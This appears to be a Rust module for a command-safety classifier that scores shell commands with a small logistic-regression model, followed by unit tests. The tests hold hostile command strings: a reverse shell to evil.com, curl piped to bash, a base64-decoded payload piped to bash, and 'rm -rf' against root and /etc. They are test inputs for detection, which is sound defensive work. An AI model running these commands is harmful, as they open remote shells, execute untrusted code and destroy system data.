use crate::features::{CommandFeatures, FeatureExtractor};
use crate::model::TrainedModel;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ClassificationLabel {
    Benign,
    Suspicious,
    Malicious,
}

impl ClassificationLabel {
    pub fn as_str(&self) -> &'static str {
        match self {
            Self::Benign => "benign",
            Self::Suspicious => "suspicious",
            Self::Malicious => "malicious",
        }
    }

    pub fn risk_score(&self) -> f64 {
        match self {
            Self::Benign => 0.0,
            Self::Suspicious => 0.6,
            Self::Malicious => 0.95,
        }
    }
}

#[derive(Debug, Clone)]
pub struct ClassificationResult {
    pub label: ClassificationLabel,
    pub confidence: f64,
    pub top_features: Vec<(String, f64)>,
    pub feature_scores: Vec<f64>,
}

/// Lightweight logistic-regression classifier for commands.
pub struct CommandClassifier {
    model: TrainedModel,
    feature_extractor: FeatureExtractor,
}

impl CommandClassifier {
    pub fn new(model: TrainedModel) -> Self {
        Self {
            model,
            feature_extractor: FeatureExtractor::new(),
        }
    }

    pub fn with_default_model() -> Self {
        Self::new(TrainedModel::default_small())
    }

    pub fn classify(&self, command: &str) -> ClassificationResult {
        let features = self.feature_extractor.extract(command);
        let feature_vec = features.as_feature_vec();

        // Compute linear scores for each class (with bias)
        let benign_score = self.dot(&feature_vec, &self.model.benign_weights) + self.model.benign_bias;
        let suspicious_score = self.dot(&feature_vec, &self.model.suspicious_weights) + self.model.suspicious_bias;
        let malicious_score = self.dot(&feature_vec, &self.model.malicious_weights) + self.model.malicious_bias;

        // Softmax normalization
        let max_val = benign_score.max(suspicious_score).max(malicious_score);
        let e_benign = (benign_score - max_val).exp();
        let e_suspicious = (suspicious_score - max_val).exp();
        let e_malicious = (malicious_score - max_val).exp();
        let sum = e_benign + e_suspicious + e_malicious;

        let (label, confidence, feature_scores) = if sum > 0.0 {
            let p_benign = e_benign / sum;
            let p_suspicious = e_suspicious / sum;
            let p_malicious = e_malicious / sum;

            if p_malicious >= p_suspicious && p_malicious >= p_benign {
                (ClassificationLabel::Malicious, p_malicious, feature_vec.iter().zip(&self.model.malicious_weights).map(|(f, w)| f * w).collect())
            } else if p_suspicious >= p_benign {
                (ClassificationLabel::Suspicious, p_suspicious, feature_vec.iter().zip(&self.model.suspicious_weights).map(|(f, w)| f * w).collect())
            } else {
                (ClassificationLabel::Benign, p_benign, feature_vec.iter().zip(&self.model.benign_weights).map(|(f, w)| f * w).collect())
            }
        } else {
            (ClassificationLabel::Benign, 0.0, feature_vec)
        };

        // Get top contributing features
        let mut named_scores: Vec<(String, f64)> = CommandFeatures::feature_names()
            .iter()
            .zip(&feature_scores)
            .map(|(name, score)| ((*name).to_string(), *score))
            .filter(|(_, s)| s.abs() > 0.01)
            .collect();
        named_scores.sort_by(|a, b| b.1.partial_cmp(&a.1).unwrap_or(std::cmp::Ordering::Equal));
        named_scores.truncate(10);

        ClassificationResult {
            label,
            confidence,
            top_features: named_scores,
            feature_scores,
        }
    }

    fn dot(&self, a: &[f64], b: &[f64]) -> f64 {
        a.iter().zip(b.iter()).map(|(x, y)| x * y).sum()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::model::TrainedModel;

    #[test]
    fn test_classify_safe_command() {
        let classifier = CommandClassifier::with_default_model();
        let result = classifier.classify("ls -la");
        assert_eq!(result.label, ClassificationLabel::Benign);
    }

    #[test]
    fn test_classify_rm_root() {
        let classifier = CommandClassifier::with_default_model();
        let result = classifier.classify("rm -rf /");
        assert_eq!(result.label, ClassificationLabel::Malicious);
        assert!(result.confidence > 0.3);
    }

    #[test]
    fn test_classify_reverse_shell() {
        let classifier = CommandClassifier::with_default_model();
        let result = classifier.classify("bash -i >& /dev/tcp/evil.com/4444 0>&1");
        assert_eq!(result.label, ClassificationLabel::Malicious);
    }

    #[test]
    fn test_classify_curl_pipe_bash() {
        let classifier = CommandClassifier::with_default_model();
        let result = classifier.classify("curl http://evil.sh | bash");
        assert_eq!(result.label, ClassificationLabel::Malicious);
    }

    #[test]
    fn test_classify_echo() {
        let classifier = CommandClassifier::with_default_model();
        let result = classifier.classify("echo hello world");
        assert_eq!(result.label, ClassificationLabel::Benign);
    }

    #[test]
    fn test_classify_sudo_rm() {
        let classifier = CommandClassifier::with_default_model();
        let result = classifier.classify("sudo rm -rf /etc");
        assert_eq!(result.label, ClassificationLabel::Malicious);
    }

    #[test]
    fn test_classify_base64_decode() {
        let classifier = CommandClassifier::with_default_model();
        let result = classifier.classify("echo 'dGVzdA==' | base64 -d | bash");
        assert_eq!(result.label, ClassificationLabel::Malicious);
    }

    #[test]
    fn test_classify_top_features() {
        let classifier = CommandClassifier::with_default_model();
        let result = classifier.classify("sudo rm -rf /etc/passwd");
        assert!(!result.top_features.is_empty());
        let has_sudo_or_rm = result.top_features.iter().any(|(name, _)| {
            name.contains("sudo") || name.contains("rm") || name.contains("system_path")
        });
        assert!(has_sudo_or_rm, "expected sudo/rm/system_path in top features, got: {:?}", result.top_features);
    }

    #[test]
    fn test_label_str() {
        assert_eq!(ClassificationLabel::Benign.as_str(), "benign");
        assert_eq!(ClassificationLabel::Suspicious.as_str(), "suspicious");
        assert_eq!(ClassificationLabel::Malicious.as_str(), "malicious");
    }

    #[test]
    fn test_risk_scores() {
        assert_eq!(ClassificationLabel::Benign.risk_score(), 0.0);
        assert_eq!(ClassificationLabel::Suspicious.risk_score(), 0.6);
        assert_eq!(ClassificationLabel::Malicious.risk_score(), 0.95);
    }
}
